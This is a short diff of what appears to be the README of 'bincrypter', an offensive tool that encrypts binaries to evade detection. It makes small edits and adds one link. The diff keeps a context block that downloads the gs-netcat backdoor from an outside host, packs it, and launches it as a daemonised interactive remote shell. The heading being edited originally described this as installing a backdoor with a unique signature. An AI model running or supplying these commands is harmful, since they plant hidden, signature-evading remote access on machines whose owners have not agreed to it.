@@ -43,9 +43,9 @@ cp /usr/bin/id id
 # uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Real world example (install a backdoor with a unique signature):
+Real world example:
 ```shell
-curl -SsfL "https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)" | PASSWORD="foobar" ./bincrypter >gsnc
+curl -SsfL "https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)" | PASSWORD="foobar" ./bincrypter  >gsnc
 chmod +x gsnc
 PASSWORD="foobar" GS_ARGS="-ilD -s ChangeMe" ./gsnc
 ```
@@ -54,6 +54,7 @@ PASSWORD="foobar" GS_ARGS="-ilD -s ChangeMe" ./gsnc
 Other great work:  
 https://github.com/guitmz/ezuri  
 https://github.com/upx/upx  
+https://bitlackeys.org/#sherlocked  
 
 ---
 Join the fun: https://thc.org/ops  
